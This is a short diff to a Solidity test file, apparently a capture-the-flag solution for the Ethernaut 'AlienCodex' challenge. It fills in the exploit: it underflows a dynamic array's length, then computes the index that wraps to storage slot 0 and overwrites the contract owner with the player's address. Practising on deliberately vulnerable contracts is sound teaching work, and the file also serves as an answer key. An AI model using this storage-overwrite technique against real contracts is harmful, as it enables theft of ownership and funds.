@@ -38,7 +38,14 @@ contract TestAlienCodex is Test {
     function testSolution() public {
         vm.startPrank(player);
 
-        // Your exploit goes here
+        instance.makeContact();
+        instance.retract();
+
+        // 0 = keccak256(p) + i -> p = 1
+        // i = -keccak256(1)
+        // slot0 = 2^256 - 1 + 1 - keccak256(1)
+        uint256 i = (2 ** 256 - 1) - uint256(keccak256(abi.encode(1))) + 1;
+        instance.revise(i, bytes32(abi.encode(player)));
 
         vm.stopPrank();
 
